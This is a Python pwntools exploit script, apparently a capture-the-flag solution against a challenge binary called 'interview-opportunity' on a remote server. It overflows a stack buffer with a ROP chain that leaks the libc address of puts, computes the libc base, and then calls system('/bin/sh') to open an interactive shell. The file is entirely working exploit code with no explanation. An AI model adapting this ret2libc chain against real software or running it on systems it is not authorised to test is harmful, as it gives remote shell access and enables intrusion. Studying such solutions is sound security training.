from pwn import *

elf = ELF('./interview-opportunity')
# p = elf.process()
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = remote('mc.ax', 31081)
libc = ELF('./libc.so.6')

pop_rdi = 0x0000000000401313
ret = pop_rdi + 1

offset = 34

payload = b'a'*offset
payload += p64(pop_rdi)
payload += p64(elf.got.puts)
payload += p64(elf.sym.puts)
payload += p64(elf.sym['main'])

p.sendline(payload)

p.recvuntil(b'Hello: \n')
p.recvline()

libc_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
print(hex(libc_leak))

libc.address = libc_leak - libc.sym.puts
print(hex(libc.address))

system = libc.sym.system
bin_sh = next(libc.search(b'/bin/sh'))

payload = b'a'*offset
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)

p.sendline(payload)

p.interactive()